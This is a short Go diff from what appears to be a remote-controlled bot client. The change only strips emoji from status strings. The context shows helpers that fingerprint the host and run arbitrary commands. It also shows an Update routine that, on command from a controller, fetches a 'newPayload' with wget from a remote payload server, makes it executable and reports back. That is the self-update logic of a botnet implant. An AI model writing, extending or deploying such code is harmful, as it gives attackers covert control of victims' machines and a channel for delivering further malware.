@@ -26,7 +26,7 @@ func convInt(str string) int {
 func getHostname() string {
 	hostName, err := os.Hostname()
 	if err != nil {
-		return "🗑 Failed to get hostname!!!"
+		return "Failed to get hostname!!!"
 	}
 	return hostName
 }
@@ -34,7 +34,7 @@ func getHostname() string {
 func execComd(comd string, args ...string) string {
 	fmtComd, err := exec.Command(comd, args...).Output()
 	if err != nil {
-		return "🗑 Failed to execute command!!!"
+		return "Failed to execute command!!!"
 	}
 	return string(fmtComd)
 }
@@ -42,7 +42,7 @@ func execComd(comd string, args ...string) string {
 func getDiskSpace() string {
 	wd, err := os.Getwd()
 	if err != nil {
-		return "🗑 Failed to get free disk space!!!"
+		return "Failed to get free disk space!!!"
 	}
 	var stat unix.Statfs_t
 	unix.Statfs(wd, &stat)
@@ -52,7 +52,7 @@ func getDiskSpace() string {
 func (b *Bot) Update() {
 	if setCall, setKey := SetupCaller(); setKey {
 		defer Kill()
-		b.Report("🖥 START UPDATING...")
+		b.Report("START UPDATING...")
 		newPayload := "." + setCall.CallBot.newPayload
 		execComd("wget", "-O", newPayload, setCall.CallBot.pServer)
 		execComd("chmod", "700", newPayload)
